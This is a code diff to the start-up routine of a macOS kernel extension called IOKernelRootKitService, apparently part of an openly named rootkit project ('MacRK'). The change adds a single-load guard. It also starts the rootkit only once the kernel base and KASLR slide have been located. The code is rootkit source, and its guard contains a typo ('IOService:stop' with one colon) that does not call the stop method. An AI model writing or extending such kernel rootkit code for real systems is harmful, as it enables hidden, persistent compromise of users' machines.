@@ -10,6 +10,8 @@
 
 #include "Log.hpp"
 
+static bool loaded = false;
+
 OSDefineMetaClassAndStructors(IOKernelRootKitService, IOService)
 
 bool IOKernelRootKitService::init(OSDictionary *properties)
@@ -33,9 +35,18 @@ bool IOKernelRootKitService::start(IOService *provider)
 {
 	kern_return_t ret = kIOReturnSuccess;
 
+	if(loaded)
+	{
+		IOService:stop(provider);
+
+		return !loaded;
+	}
+
+	loaded = true;
+
 	mach_vm_address_t kernel_base = Kernel::findKernelBase();
 
-	off_t kernel_slide = Kernel::findKernelSlide();
+	uint64_t kernel_slide = Kernel::findKernelSlide();
 
 	char buffer[128];
 
@@ -53,20 +64,23 @@ bool IOKernelRootKitService::start(IOService *provider)
 
 	MAC_RK_LOG("MacRK::@ kernel base = %s\n", buffer);
 
-	this->kernel = Kernel::create(kernel_base, kernel_slide);
-
-	this->kernel->setRootKitService(this);
-
-	// this->tfp0 = this->kernel->getKernelTaskPort();
-
-	ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
-
-	if(ret == kIOReturnSuccess)
+	if(kernel_base && kernel_slide)
 	{
-		this->rootkit = mac_rootkit_get_rootkit();
-	}
+		this->kernel = Kernel::create(kernel_base, kernel_slide);
 
-	registerService();
+		this->kernel->setRootKitService(this);
+
+		// this->tfp0 = this->kernel->getKernelTaskPort();
+
+		ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
+
+		if(ret == kIOReturnSuccess)
+		{
+			this->rootkit = mac_rootkit_get_rootkit();
+		}
+
+		registerService();
+	}
 
 	return ret == kIOReturnSuccess && IOService::start(provider);
 }
